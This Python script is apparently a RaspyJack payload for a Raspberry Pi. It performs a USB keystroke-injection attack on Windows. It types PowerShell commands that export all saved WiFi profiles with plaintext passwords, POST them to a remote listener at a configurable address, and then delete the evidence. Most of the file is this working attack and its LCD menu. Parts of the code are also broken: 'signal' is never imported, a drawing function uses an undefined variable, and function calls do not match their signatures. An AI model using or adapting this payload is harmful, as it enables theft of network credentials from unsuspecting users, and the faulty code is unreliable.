#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **HID Attack: Exfiltrate WiFi Passwords (Win)**
======================================================================
A HID attack that uses PowerShell to export all saved WiFi profiles on a
Windows machine to XML files in the temp directory. These files include
the WiFi password in plaintext if it was saved.

A second command then sends the contents of these files to a remote
listener.

**NOTE:** Requires a listener to be running to receive the data.
"""

import os, sys, subprocess, time
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

from hid_helper import hid_helper # Import the new HID helper

# --- CONFIGURATION ---
LISTENER_IP = "192.168.1.100" # Will be configurable
LISTENER_PORT = "8000" # Will be configurable

# --- GPIO & LCD ---
PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    FONT = ImageFont.load_default() # General purpose font
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT_TITLE = ImageFont.load_default() # Fallback to default font
    FONT = ImageFont.load_default() # Fallback to default font

# --- Globals & Shutdown ---
running = True
current_ip_input = LISTENER_IP # Initial value for IP input
ip_input_cursor_pos = 0 # Cursor position for IP input
current_port_input = LISTENER_PORT # Initial value for Port input
port_input_cursor_pos = 0 # Cursor position for Port input

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def show_message(lines, color="lime"):
    if not HARDWARE_LIBS_AVAILABLE:
        for line in lines:
            print(line)
        return
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = FONT_TITLE # Use FONT_TITLE for messages
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(image, 0, 0)

def draw_ui(screen_state="main"):
    if not HARDWARE_LIBS_AVAILABLE:
        print(f"UI State: {screen_state}")
        if screen_state == "main":
            print(f"Listener IP: {LISTENER_IP}")
            print(f"Listener Port: {LISTENER_PORT}")
        return

    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Win Exfil WiFi Pass", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Listener IP:", font=FONT, fill="white")
        d.text((5, 45), LISTENER_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Listener Port:", font=FONT, fill="white")
        d.text((5, 80), LISTENER_PORT, font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY1=Edit IP | KEY2=Edit Port | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Listener IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "port_input":
        d.text((5, 30), "Enter Listener Port:", font=FONT, fill="white")
        display_port = list(current_port_input)
        if port_input_cursor_pos < len(display_port):
            display_port[port_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_port), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 50), "Injecting PowerShell...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), f"To: {LISTENER_IP}:{LISTENER_PORT}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    elif screen_state == "success":
        d.text((5, 50), "Attack Sent!", font=FONT_TITLE, fill="lime")
        d.text((5, 70), "Check listener", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "failed":
        d.text((5, 50), "Attack FAILED!", font=FONT_TITLE, fill="red")
        d.text((5, 70), "Check console.", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "hid_error":
        d.text((5, 40), "HID Gadget NOT", font=FONT_TITLE, fill="red")
        d.text((5, 60), "enabled!", font=FONT_TITLE, fill="red")
        d.text((5, 80), "See update_deps.py", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1 # Start cursor at end
    
    draw_ui("ip_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel IP input
            return None
        
        if btn == "OK": # Confirm IP
            # Validate IP format
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                show_message(["Invalid IP!", "Try again."], "red")
                time.sleep(2)
                current_ip_input = initial_ip # Reset to initial
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else: # DOWN
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    # Cannot change dot, move cursor
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.1)
    return None

def handle_port_input_logic(initial_port):
    global current_port_input, port_input_cursor_pos
    current_port_input = initial_port
    port_input_cursor_pos = len(initial_port) - 1
    
    draw_ui("port_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel Port input
            return None
        
        if btn == "OK": # Confirm Port
            if current_port_input.isdigit() and 1 <= int(current_port_input) <= 65535:
                return current_port_input
            else:
                show_message(["Invalid Port!", "Try again."], "red")
                time.sleep(2)
                current_port_input = initial_port # Reset to initial
                port_input_cursor_pos = len(initial_port) - 1
                draw_ui("port_input")
        
        if btn == "LEFT":
            port_input_cursor_pos = max(0, port_input_cursor_pos - 1)
            draw_ui("port_input")
        elif btn == "RIGHT":
            port_input_cursor_pos = min(len(current_port_input), port_input_cursor_pos + 1)
            draw_ui("port_input")
        elif btn == "UP" or btn == "DOWN":
            if port_input_cursor_pos < len(current_port_input):
                char_list = list(current_port_input)
                current_char = char_list[port_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else: # DOWN
                        digit = (digit - 1 + 10) % 10
                    char_list[port_input_cursor_pos] = str(digit)
                    current_port_input = "".join(char_list)
                draw_ui("port_input")
        
        time.sleep(0.1)
    return None

# --- Main Attack Logic ---
def run_attack():
    global LISTENER_IP, LISTENER_PORT
    
    draw_ui("attacking")
    
    if not hid_helper.is_hid_gadget_enabled:
        draw_ui("hid_error")
        time.sleep(4)
        return False

    # PowerShell commands
    # 1. Export all wifi profiles to temp folder
    cmd1 = "netsh wlan export profile folder=$env:TEMP key=clear"
    # 2. Send the contents of all generated XML files to our listener
    cmd2 = f"foreach ($file in (Get-ChildItem $env:TEMP -Filter *.xml)) {{ $content = Get-Content $file.FullName; $request = [System.Net.WebRequest]::Create('http://{LISTENER_IP}:{LISTENER_PORT}/'); $request.Method = 'POST'; $bytes = [System.Text.Encoding]::ASCII.GetBytes($content); $request.ContentLength = $bytes.Length; $requestStream = $request.GetRequestStream(); $requestStream.Write($bytes, 0, $bytes.Length); $requestStream.Close() }}"
    
    try:
        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.r) # Win+R
        time.sleep(0.5)
        hid_helper.type_string("powershell")
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.75)
        hid_helper.type_string(cmd1)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(1)
        hid_helper.type_string(cmd2)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(2)
        hid_helper.type_string("rm $env:TEMP\\*.xml") # Clean up XML files
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
        hid_helper.type_string("exit")
        hid_helper.press_key(hid_helper.keyboard.enter)
        
        draw_ui("success")
        return True
    except Exception as e:
        print(f"Error running HID attack: {e}", file=sys.stderr)
        draw_ui("failed")
        return False

# --- Execution ---
if __name__ == '__main__':
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID Win Exfil WiFi Passwords.", file=sys.stderr)
        sys.exit(1)

    current_screen = "main"
    try:
        while running:
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0:
                    if run_attack():
                        time.sleep(3) # Display success/failure
                    current_screen = "main"
                    time.sleep(0.3) # Debounce
                
                if GPIO.input(PINS["KEY1"]) == 0: # Edit Listener IP
                    current_ip_input = LISTENER_IP
                    current_screen = "ip_input"
                    time.sleep(0.3) # Debounce
                
                if GPIO.input(PINS["KEY2"]) == 0: # Edit Listener Port
                    current_port_input = LISTENER_PORT
                    current_screen = "port_input"
                    time.sleep(0.3) # Debounce
            
            elif current_screen == "ip_input":
                char_set = "0123456789."
                new_ip = handle_ip_input_logic(current_ip_input, "ip_input", char_set)
                if new_ip:
                    LISTENER_IP = new_ip
                current_screen = "main"
                time.sleep(0.3) # Debounce
            
            elif current_screen == "port_input":
                char_set = "0123456789"
                new_port = handle_port_input_logic(current_port_input, "port_input", char_set)
                if new_port:
                    LISTENER_PORT = new_port
                current_screen = "main"
                time.sleep(0.3) # Debounce
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        if HARDWARE_LIBS_AVAILABLE:
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID Win Exfil WiFi Passwords payload finished.")
